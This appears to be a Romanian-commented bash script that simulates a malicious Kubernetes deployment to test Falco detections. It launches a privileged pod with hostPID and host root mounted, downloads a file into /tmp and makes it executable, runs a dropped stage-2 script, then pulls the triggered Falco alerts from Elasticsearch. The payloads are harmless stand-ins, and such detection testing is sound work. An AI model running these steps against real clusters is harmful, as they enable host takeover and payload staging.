#!/bin/bash
# Scenariul 8 - Malicious Deployment (T1610 Deploy Container, T1105 Ingress Tool Transfer,
# T1059 Command and Scripting Interpreter)
# 1. Deploy un pod malitios (privilegiat, hostPID, hostPath /). 2-5: actiuni post-deployment
#    in interiorul lui (package manager, descarcare payload, chmod +x in /tmp, executie script).

set -e

NS=attack-target
MPOD=malicious-pod
ES=http://10.102.14.31:9200
HERE=$(dirname "$0")

echo "=================================================="
echo "Scenariul 8 - Malicious Deployment"
echo "Start: $(date +%T)"
echo "=================================================="

START_TS=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)
echo "[marker] Start UTC: $START_TS"
echo ""

# ---------------------------------------------------------------------------
# step 1/5 - Deploy workload malitios (privilegiat + hostPID + hostPath /) [T1610]
# ---------------------------------------------------------------------------
echo "[step 1/5] kubectl apply malicious-pod.yaml (privileged, hostPID, hostPath /)"
kubectl apply -f "$HERE/malicious-pod.yaml"
echo "  ... astept pod Ready (max 60s)"
kubectl wait --for=condition=Ready pod/$MPOD -n $NS --timeout=60s || kubectl get pod $MPOD -n $NS
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 2/5 - Package manager intr-un container care ruleaza deja [T1610 / T1059]
# ---------------------------------------------------------------------------
echo "[step 2/5] apt-get update && apt-get install -y curl (in malicious-pod)"
kubectl exec -n $NS $MPOD -- bash -c "apt-get update -qq 2>&1 | tail -1; DEBIAN_FRONTEND=noninteractive apt-get install -y -qq curl 2>&1 | tail -2; which curl"
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 3/5 - Descarca un payload in /tmp si il face executabil [T1105]
# ---------------------------------------------------------------------------
echo "[step 3/5] curl -o /tmp/payload <url> && chmod +x /tmp/payload"
kubectl exec -n $NS $MPOD -- bash -c "curl -s -m 8 -o /tmp/payload http://example.com/ ; ls -l /tmp/payload; chmod +x /tmp/payload; ls -l /tmp/payload"
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 4/5 - Drop & ruleaza un script de stage-2 din /tmp [T1059]
# ---------------------------------------------------------------------------
echo "[step 4/5] echo '...' > /tmp/stage2.sh && chmod +x /tmp/stage2.sh && bash /tmp/stage2.sh"
kubectl exec -n $NS $MPOD -- bash -c "printf '#!/bin/bash\nid\nhostname\nuname -a\n' > /tmp/stage2.sh && chmod +x /tmp/stage2.sh && bash /tmp/stage2.sh"
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 5/5 - "Instaleaza" si executa un binar dropat in /tmp [T1105 / T1059]
# (folosim /bin/sleep ca binar inofensiv, copiat ca /tmp/payload2)
# ---------------------------------------------------------------------------
echo "[step 5/5] cp /bin/sleep /tmp/payload2 && chmod 777 /tmp/payload2 && /tmp/payload2 1"
kubectl exec -n $NS $MPOD -- bash -c "cp /bin/sleep /tmp/payload2 && chmod 777 /tmp/payload2 && /tmp/payload2 1 && echo executed-/tmp/payload2"
echo ""

echo "=================================================="
echo "Atac terminat. Astept 35s pentru propagare ES..."
echo "=================================================="
sleep 35

echo ""
echo "=== Reguli FALCO declansate de la $START_TS ==="
curl -s "$ES/security-*/_search?size=0" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags.keyword\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}},\"aggs\":{\"by_rule\":{\"terms\":{\"field\":\"rule.keyword\",\"size\":20}},\"by_priority\":{\"terms\":{\"field\":\"priority.keyword\",\"size\":10}}}}" \
  | python3 -m json.tool | sed -n '/aggregations/,$p'

echo ""
echo "=== Sample 12 detectii (cronologic) ==="
curl -s "$ES/security-*/_search?size=12" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags.keyword\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}},\"sort\":[{\"@timestamp\":\"asc\"}],\"_source\":[\"@timestamp\",\"rule\",\"priority\",\"output\"]}" \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
for h in d.get('hits',{}).get('hits',[]):
    s = h['_source']
    print(f\"  {s.get('@timestamp','?')[:19]} [{s.get('priority','?'):8}] {s.get('rule','?')}\")
    out = s.get('output','')
    if out:
        print(f\"    -> {out[:200]}\")
"

echo ""
echo -n "Total Falco events: "
curl -s "$ES/security-*/_count" -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags.keyword\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}}}"
echo ""

echo ""
echo "=== Cleanup: kubectl delete pod malicious-pod ==="
kubectl delete -f "$HERE/malicious-pod.yaml" --wait=false 2>&1

echo ""
echo "End: $(date +%T)"
